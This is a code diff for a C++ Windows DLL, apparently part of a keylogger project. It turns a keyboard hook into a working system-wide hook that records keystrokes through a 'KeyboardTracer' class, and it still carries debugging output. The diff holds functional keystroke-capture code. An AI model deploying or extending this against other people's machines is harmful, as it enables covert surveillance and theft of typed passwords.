@@ -3,10 +3,33 @@
 #include "window_manager.h"
 #include "keyboard_tracer.h"
 
-//HWND hWnd = NULL;
-HHOOK hHook = NULL;
+#pragma data_seg(".shareddata")
+HWND hWnd = 0;
+HHOOK hHook = 0;
+#pragma data_seg()
+
+HINSTANCE hInst;
 WindowManager* window_manager;
 KeyboardTracer* tracer;
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		hInst = hModule;
+		break;
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
+
 
 #pragma region Export DLL 
 extern "C" __declspec(dllexport) void init()
@@ -27,8 +50,16 @@ extern "C" __declspec(dllexport) void print_win_title()
 extern "C" __declspec(dllexport) void my_get_foreground_window()
 {
 	char buf[100];
-	HWND hWnd;
 	hWnd = GetForegroundWindow();
+	if (hWnd == NULL)
+	{
+		std::cout << "[!!!] fail to set Window handle." << std::endl;
+
+	}
+	else
+	{
+		std::cout << "[*] set Window handle." << std::endl;
+	}
 	GetWindowTextA(hWnd, buf, 100);
 	window_manager->SetWinTitle(buf);
 	window_manager->SetWindowHandle(hWnd);
@@ -36,9 +67,8 @@ extern "C" __declspec(dllexport) void my_get_foreground_window()
 
 extern "C" __declspec(dllexport) void my_set_process_id()
 {
-	HWND h = window_manager->GetWindowHandle();
 	DWORD id;
-	GetWindowThreadProcessId(h, &id);
+	GetWindowThreadProcessId(hWnd, &id);
 	window_manager->SetProcessId(id);
 }
 
@@ -52,15 +82,6 @@ extern "C" __declspec(dllexport) char* get_win_title()
 	return window_manager->GetWinTitle();
 }
 
-extern "C" __declspec(dllexport) void start_hook()
-{
-	StartHook();
-}
-
-extern "C" __declspec(dllexport) void end_hook()
-{
-	EndHook();
-}
 #pragma endregion
 
 
@@ -70,7 +91,7 @@ void initialize()
 	tracer = new KeyboardTracer();
 }
 
-LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
+extern "C" __declspec(dllexport) LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	std::cout << "hello" << std::endl;
 	if (nCode < 0)
@@ -78,30 +99,27 @@ LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
 		return CallNextHookEx(hHook, nCode, wParam, lParam);
 	}
 	tracer->setLpBinary(lParam);
-
+	MessageBoxW(hWnd, L"hello", TEXT("click"), MB_OK);
 	if (tracer->getLpBinary(0) == 1)
 	{
 		tracer->registKeyLog(wParam);
 		tracer->print_log();
 	}
-	return TRUE;
+	return CallNextHookEx(hHook, nCode, wParam, lParam);
 }
 
-void StartHook()
+extern "C" __declspec(dllexport) void StartHook()
 {
-	HWND m_hWnd = window_manager->GetWindowHandle();
-	if (m_hWnd == NULL)
+	if (hWnd == NULL)
 	{
 		std::cout << "[!!!] window handle is null. fail to start hook" << std::endl;
 		return;
 	}
-	//HINSTANCE hInst;
-	//hInst = (HINSTANCE)GetWindowLongPtr(m_hWnd, GWLP_HINSTANCE);
-	//hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, hdll, GetCurrentThreadId());
-	hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, hdll, 0);
+
+	hHook = SetWindowsHookEx(WH_KEYBOARD, HookProc, hInst, 0);
 	if (hHook == NULL)
 	{
-		std::cout << "[!!!] hook is null. fail to start hook.s" << std::endl;
+		std::cout << "[!!!] hook is null. fail to start hook" << std::endl;
 		return;
 	}
 	else
@@ -111,7 +129,7 @@ void StartHook()
 	}
 }
 
-bool EndHook()
+extern "C" __declspec(dllexport) bool EndHook()
 {
 	return UnhookWindowsHookEx(hHook);
 }
